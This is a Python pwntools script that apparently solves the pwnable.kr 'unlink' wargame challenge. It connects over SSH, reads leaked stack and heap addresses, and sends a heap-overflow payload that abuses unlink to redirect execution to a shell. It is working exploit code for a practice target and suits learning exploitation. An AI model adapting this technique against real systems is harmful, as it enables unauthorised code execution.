#!/usr/bin/python3
import sys
from pwn import *


NAME = 'unlink'
BUFFER_SIZE = 0x10
RETURN_ADDRESS_OFFSET = -24 - 0x8
SHELL_ADDRESS = 0x080484eb
HEAP_ADDRESS_OFFSET = 0x2c
ESP_ADDRESS_OFFSET = 0x28

session = ssh(host='pwnable.kr', user=NAME, port=2222, password='guest')
io = session.run('/bin/sh', env={"PS1": ""})

io.sendline('./unlink')
unlink_stack = io.recvline().decode()
unlink_heap = io.recvline().decode()
io.recvline()

stack_leak = int(unlink_stack.split(':')[1], 16)
heap_leak = int(unlink_heap.split(':')[1], 16)
payload = b'a' * BUFFER_SIZE
return_address = stack_leak + RETURN_ADDRESS_OFFSET
heap_address = heap_leak + HEAP_ADDRESS_OFFSET
esp_address = heap_leak + ESP_ADDRESS_OFFSET

payload += bytes.fromhex(hex(return_address)[2:].rjust(8, '0'))[::-1]
payload += bytes.fromhex(hex(heap_address)[2:].rjust(8, '0'))[::-1]
payload += b'\x00\x00\x00\x00'
payload += bytes.fromhex(hex(SHELL_ADDRESS)[2:].rjust(8, '0'))[::-1]
payload += bytes.fromhex(hex(esp_address)[2:].rjust(8, '0'))[::-1]

io.sendline(payload)
io.sendline('cat intended_solution.txt')
print(io.recvrepeat(1).decode())